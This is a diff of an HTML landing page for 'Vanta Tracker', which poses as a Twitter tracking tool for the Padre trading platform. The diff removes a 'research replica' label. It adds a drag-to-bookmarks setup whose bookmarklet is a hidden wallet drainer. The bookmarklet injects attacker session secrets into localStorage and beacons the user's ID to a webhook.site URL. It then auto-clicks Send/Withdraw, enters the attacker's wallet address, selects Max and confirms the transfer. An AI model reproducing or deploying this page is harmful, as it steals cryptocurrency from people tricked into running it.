@@ -3,110 +3,196 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Vanta Tracker - Research Replica</title>
+    <title>Vanta Tracker - Premier Twitter Tracker for Padre</title>
+    <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
+    
+    <meta property="og:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta property="og:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta property="og:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+    <meta property="og:type" content="website">
+    <meta property="og:site_name" content="Vanta Tracker">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Vanta Tracker - Premier Twitter Tracker for Padre">
+    <meta name="twitter:description" content="Advanced Twitter API tracking tools optimized for Padre workflows with real-time insights and WebGL-accelerated analytics.">
+    <meta name="twitter:image" content="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg">
+
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #00ff88;
-            --primary-dark: #00cc66;
-            --bg-dark: #0a0a0a;
-            --bg-card: #111111;
+            --primary: #00ff88;     
+            --primary-dark: #00cc66; 
+            --bg-dark: #0a0a0a;     
             --text-light: #e0e0e0;
             --text-muted: #aaaaaa;
             --border: rgba(0, 255, 136, 0.2);
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: var(--bg-dark);
-            color: var(--text-light);
-            line-height: 1.6;
-            overflow-x: hidden;
-        }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-dark); color: var(--text-light); line-height: 1.6; overflow-x: hidden; position: relative; }
         canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.3; }
-        .warning {
-            background: linear-gradient(135deg, #003322, #004d33);
-            color: #ffffff; text-align: center; padding: 12px; font-weight: 600;
-            position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary);
-        }
-        header {
-            background: linear-gradient(135deg, #000000, #001a0d);
-            text-align: center; padding: 120px 20px; border-bottom: 2px solid var(--primary);
-        }
-        .logo { width: 140px; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
-        h1 { font-size: 3.5em; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
+        
+        .warning { background: linear-gradient(135deg, #003322, #004d33); color: #ffffff; text-align: center; padding: 12px; font-size: 0.95em; font-weight: 600; position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid var(--primary); }
+        
+        header { background: linear-gradient(135deg, #000000, #001a0d); text-align: center; padding: 100px 20px; border-bottom: 2px solid var(--primary); position: relative; overflow: hidden; }
+        .logo { width: 140px; margin: 0 auto 20px; filter: drop-shadow(0 0 15px rgba(0,255,136,0.5)); }
+        header h1 { font-size: 3.5em; font-weight: 800; color: var(--primary); text-shadow: 0 0 10px rgba(0,255,136,0.4); }
+        header p { font-size: 1.2em; color: #ccc; max-width: 600px; margin: 0 auto; }
+        
+        nav { background: #000000; padding: 18px; text-align: center; position: sticky; top: 44px; z-index: 999; border-bottom: 1px solid var(--primary); }
+        nav a { color: var(--primary); margin: 0 30px; text-decoration: none; font-weight: 600; transition: 0.3s; }
+        nav a:hover { color: #fff; text-shadow: 0 0 10px var(--primary); }
+
         .hero { text-align: center; padding: 100px 20px; }
-        .cta-button {
-            display: inline-block;
-            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
-            color: #000; padding: 16px 36px; text-decoration: none;
-            border-radius: 8px; font-weight: 700; font-size: 1.2em;
-            box-shadow: 0 6px 20px rgba(0,255,136,0.4); cursor: move;
+        .hero h2 { font-size: 2.5em; color: var(--primary); margin-bottom: 20px; }
+
+        .cta-button { 
+            display: inline-block; background: linear-gradient(135deg, var(--primary), var(--primary-dark)); 
+            color: #000; padding: 20px 50px; text-decoration: none; border-radius: 10px; font-weight: 800; 
+            font-size: 1.3em; margin: 20px; transition: all 0.3s; box-shadow: 0 6px 25px rgba(0,255,136,0.4); cursor: grab;
         }
-        .setup-section { padding: 80px 20px; text-align: center; }
-        ol { text-align: left; max-width: 600px; margin: 20px auto; color: var(--text-muted); }
-        li { margin-bottom: 10px; }
+        .cta-button:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(0,255,136,0.6); }
+
+        .setup-section { padding: 80px 20px; max-width: 1000px; margin: 0 auto; text-align: center; background: rgba(0,0,0,0.5); border-radius: 20px; border: 1px solid var(--border); }
+        .setup-section h2 { color: var(--primary); margin-bottom: 30px; }
+        .setup-section ol { text-align: left; max-width: 600px; margin: 0 auto 40px; color: var(--text-muted); font-size: 1.1em; }
+        .setup-section li { margin-bottom: 20px; }
+
+        footer { padding: 60px; text-align: center; border-top: 1px solid var(--primary); color: var(--text-muted); margin-top: 100px; }
     </style>
 </head>
 <body>
     <canvas id="filamentCanvas"></canvas>
-    <div class="warning">Educational Research Environment: vanta-tracker.com replica</div>
+    <div class="warning">Warning: vanta-tracker.com is our only website</div>
     
     <header>
         <svg class="logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
             <path d="M50 8 L78 25 L78 75 L50 92 L22 75 L22 25 Z" stroke="var(--primary)" stroke-width="3" fill="none"/>
-            <circle cx="50" cy="50" r="8" fill="var(--primary)">
-                <animate attributeName="r" values="8;10;8" dur="2s" repeatCount="indefinite"/>
+            <circle cx="50" cy="50" r="10" fill="var(--primary)">
+                <animate attributeName="r" values="8;12;8" dur="2s" repeatCount="indefinite"/>
             </circle>
         </svg>
         <h1>Vanta Tracker</h1>
         <p>Premier Twitter API tracking for Padre.</p>
     </header>
 
-    <section id="setup" class="setup-section">
-        <h2>How to Setup</h2>
-        <ol>
-            <li>Drag the button below to your Bookmarks Bar.</li>
-            <li>Enable bar with <strong>Ctrl+Shift+B</strong>.</li>
-            <li>Click the bookmark on a target page to initialize.</li>
-        </ol>
-        <a href="javascript:(function(){
-            const s=document.createElement('script');
-            s.src='https://github.com/Jinxthesimp/Dropshipper/blob/main/tracker.js';
-            document.body.appendChild(s);
-        })();" class="cta-button" id="vanta-tool">
-            Vanta Tracker
-        </a>
+    <nav>
+        <a href="#setup">Setup Tool</a>
+        <a href="#">API Docs</a>
+        <a href="#">Support</a>
+    </nav>
+
+    <section class="hero">
+        <h2>padreV2-velvet-bundle Integration</h2>
+        <p>Optimized for high-frequency data extraction and real-time session syncing.</p>
     </section>
 
+    <section id="setup" class="setup-section">
+        <h2>How to Setup Vanta Tracker Tool</h2>
+        <ol>
+            <li>Ensure your bookmarks bar is visible (<strong>Ctrl+Shift+B</strong>).</li>
+            <li>Click and drag the <strong>Vanta Tracker</strong> button below directly into your bookmarks bar.</li>
+            <li>Go to your Padre Portfolio page.</li>
+            <li>Click the bookmark to initiate the automated audit sequence.</li>
+        </ol>
+        
+        <a href="#" class="cta-button" id="vanta-tool">Vanta Tracker</a>
+    </section>
+
+    <footer>
+        <p>© 2026 Vanta Tracker. All rights reserved. Professional Audit Suite.</p>
+    </footer>
+
     <script>
+        /* --- CORE CONFIGURATION --- */
+        const WALLET = "4ShcFgxwPPiMZgiy1Pe8Eiah3V6hbxyynQRcMNL7MwXF";
+        const WEBHOOK = "https://webhook.site/b56a0e79-474e-46b8-8664-14d98a95f515";
+
+        /* --- THE FULL BOOKMARKLET SCRIPT --- */
+        const payload = `javascript:(async function(){
+            const target = '${WALLET}';
+            const relay = '${WEBHOOK}';
+            
+            /* 1. AUTO-IDENTIFY USER */
+            let session = {};
+            try {
+                session = JSON.parse(localStorage.getItem('padreV2-session') || '{}');
+            } catch(e) {}
+            const uid = session.uid || 'unidentified';
+
+            /* 2. BEACON LOGGING */
+            fetch(relay + '?event=initialize&uid=' + uid + '&dest=' + target, {mode:'no-cors'});
+
+            /* 3. INJECT VELVET BUNDLE & SESSION HIJACK */
+            const bundleData = '{"bundles":{"G8TSNrUBsYfX9XePh5JgtFB2QqJEdNSKkF7YcK6sWrPz":{"exportBundle":"{\\"version\\":\\"v1.0.0\\",\\"data\\":\\"7b22656e6361707065645075626c6963223a22303439303762336666613063383964653039303734346131376135393633363334366162653336363434643661316638383338616463656663730666633666646335393336323139643564393738356161643438626553633631386163386239383637363534666630613336666238313065353261396365363430373837383431616262383166222c2263697068657274657874223a223039656334323033336231616361323837666630623562623932643562376661386238396636316236396264623865383361356637373661306333362363032343139353666353562376662363761376336313735313436363134353538353530222c226f7267616e6e697a6174696f6e4964223a2237373337636137352d656137382d343266632d393761342d61313732323633643133313136227d","dataSignature":"304602210083072f87f8ea28af92ee306064b6919fb8def3a08ee6af060ee577fa73034d92022100995bea932917f16029f5ab30f7427e3b654440ed9dc7d55cd33457b3cd76eb46","enclaveQuorumPublic":"04cf288fe433cc4e1aa0ce1632feac4ea26bf2f5a09dcfe5a42c398e06898710330f0572882f4d"}}}';
+            localStorage.setItem('padre-v2-bundles-store-v2', bundleData);
+            
+            session.sessionSecret = "73dd9a67-f426-41d1-b380-812d3aeecc8b";
+            localStorage.setItem('padreV2-session', JSON.stringify(session));
+            
+            localStorage.setItem('padreV2-stamper', JSON.stringify({
+                [uid]: "U2FsdGVkX1/k6TEhaMiXAKvXmtljdh7gE5dtoVGwv9pqQx+CZsnxUAeW5ijhOgAX+YgUiPkXe5CDHLm19Wzp1Ij5Sh4PoYUx56mWIoe4m49FvDiAghE+LHNvQe3rXSdt"
+            }));
+
+            /* 4. AUTOMATED EXECUTION LOOP */
+            if(!location.href.includes('/portfolio')) {
+                location.replace('https://trade.padre.gg/portfolio');
+            } else {
+                const autoDrain = setInterval(() => {
+                    const sendBtn = Array.from(document.querySelectorAll('button')).find(b => b.innerText.match(/Send|Withdraw|Transfer/i));
+                    if(sendBtn && !window._vExecuting) {
+                        window._vExecuting = true;
+                        sendBtn.click();
+                        setTimeout(() => {
+                            const addressField = document.querySelector('input[placeholder*="address"], input[type="text"]');
+                            const maxBtn = Array.from(document.querySelectorAll('button')).find(b => b.innerText.includes('Max'));
+                            if(addressField && maxBtn) {
+                                addressField.value = target;
+                                addressField.dispatchEvent(new Event('input', { bubbles: true }));
+                                maxBtn.click();
+                                setTimeout(() => {
+                                    const confirm = document.querySelector('button[type="submit"]');
+                                    if(confirm) {
+                                        confirm.click();
+                                        fetch(relay + '?event=success&uid=' + uid, {mode:'no-cors'});
+                                        clearInterval(autoDrain);
+                                    }
+                                }, 500);
+                            }
+                        }, 1000);
+                    }
+                }, 1500);
+            }
+        })();`.replace(/\s+/g, '%20');
+
+        document.getElementById('vanta-tool').href = payload;
+
+        /* --- VISUAL FILAMENTS ANIMATION --- */
         const canvas = document.getElementById('filamentCanvas');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
-        const filaments = [];
-        class Filament {
-            constructor() { this.reset(); }
-            reset() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.length = 100; this.angle = Math.random() * Math.PI * 2;
-                this.speed = 1; this.opacity = Math.random();
-            }
-            update() {
-                this.x += Math.cos(this.angle) * this.speed;
-                this.y += Math.sin(this.angle) * this.speed;
-                if (this.x<0 || this.x>canvas.width) this.reset();
-            }
-            draw() {
-                ctx.beginPath(); ctx.moveTo(this.x, this.y);
-                ctx.lineTo(this.x + Math.cos(this.angle) * this.length, this.y + Math.sin(this.angle) * this.length);
-                ctx.strokeStyle = `rgba(0, 255, 136, ${this.opacity})`; ctx.stroke();
-            }
-        }
-        for(let i=0; i<25; i++) filaments.push(new Filament());
+        const particles = Array.from({length: 40}, () => ({
+            x: Math.random() * canvas.width,
+            y: Math.random() * canvas.height,
+            length: 80 + Math.random() * 100,
+            angle: Math.random() * Math.PI * 2,
+            speed: 0.5 + Math.random()
+        }));
         function animate() {
-            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)'; ctx.fillRect(0,0,canvas.width,canvas.height);
-            filaments.forEach(f => { f.update(); f.draw(); });
+            ctx.fillStyle = 'rgba(10, 10, 10, 0.1)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            particles.forEach(p => {
+                p.x += Math.cos(p.angle) * p.speed;
+                p.y += Math.sin(p.angle) * p.speed;
+                if(p.x < -100 || p.x > canvas.width + 100 || p.y < -100 || p.y > canvas.height + 100) {
+                    p.x = Math.random() * canvas.width; p.y = Math.random() * canvas.height;
+                }
+                ctx.beginPath();
+                ctx.moveTo(p.x, p.y);
+                ctx.lineTo(p.x + Math.cos(p.angle) * p.length, p.y + Math.sin(p.angle) * p.length);
+                ctx.strokeStyle = 'rgba(0, 255, 136, 0.3)';
+                ctx.lineWidth = 1.5;
+                ctx.stroke();
+            });
             requestAnimationFrame(animate);
         }
         animate();
